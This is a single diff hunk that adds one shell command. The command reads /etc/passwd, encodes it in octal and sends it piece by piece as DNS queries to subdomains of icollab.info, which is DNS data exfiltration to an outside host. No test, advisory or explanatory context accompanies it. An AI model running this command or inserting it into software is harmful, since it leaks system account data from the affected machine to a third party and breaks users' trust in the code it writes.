@@ -1,0 +1,1 @@
+cat /etc/passwd | od -An | sed 's/\s//g' | while read part; do dig a +short $part.icollab.info; done
